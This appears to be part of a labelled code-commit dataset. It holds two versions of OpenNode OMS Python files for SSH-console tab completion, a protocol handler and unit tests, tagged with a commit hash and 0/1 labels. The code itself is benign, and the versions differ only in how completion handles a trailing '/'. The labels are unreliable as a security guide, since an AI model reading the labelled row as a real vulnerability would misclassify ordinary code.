                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """"""Completes argument switches based on the argparse grammar exposed for a command""""""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith(""-""):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # ""count"" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """"""Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """"""Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """"""Completes object type names.""""""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])
/n/n/nopennode/oms/endpoint/ssh/protocol.py/n/nimport os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """"""The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of ""quit"" is received, the connection
    is dropped.

    """"""

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write(""Syntax error: %s\n"" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """"""Inserts some chars in the buffer at the current cursor position.""""""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """"""Inserts some text at the current cursor position and renders it.""""""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """"""Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """"""

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """"""Handles tab completion.""""""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '""':
                space = '"" '
            # Avoid space after '=' just for aestetics.
            # Avoid space after '/' for functionality.
            for i in ('=', '/'):
                if completions[0].endswith(i):
                    space = ''

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'
/n/n/nopennode/oms/tests/test_completion.py/n/nimport unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls ""comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]
/n/n/n",0
165,165,0a87ba7972cdcab6ce77568e8d0eb8474132315d,"/opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """"""Completes a command.""""""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """"""Completes a path name.""""""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):

        if not self.consumed(parsed, parser):
            obj = self.context.current_obj
            if IContainer.providedBy(obj):
                return [name for name in obj.listnames() if name.startswith(token)]

        return []

    def consumed(self, parsed, parser):
        """"""Check whether we have already consumed all positional arguments.""""""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """"""Completes argument switches based on the argparse grammar exposed for a command""""""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith(""-""):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # ""count"" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """"""Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """"""Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """"""Completes object type names.""""""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])
/n/n/n/opennode/oms/endpoint/ssh/protocol.py/n/nimport os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """"""The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of ""quit"" is received, the connection
    is dropped.

    """"""

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write(""Syntax error: %s\n"" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """"""Inserts some chars in the buffer at the current cursor position.""""""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """"""Inserts some text at the current cursor position and renders it.""""""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """"""Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """"""

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """"""Handles tab completion.""""""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '""':
                space = '"" '
            # Avoid space after '=' just for aestetics.
            if completions[0].endswith('='):
                space = ''

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'
/n/n/n/opennode/oms/tests/test_completion.py/n/nimport unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls ""comp')
        eq_(self.terminal.method_calls, [('write', ('utes"" ',), {})])

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]
/n/n/n",1
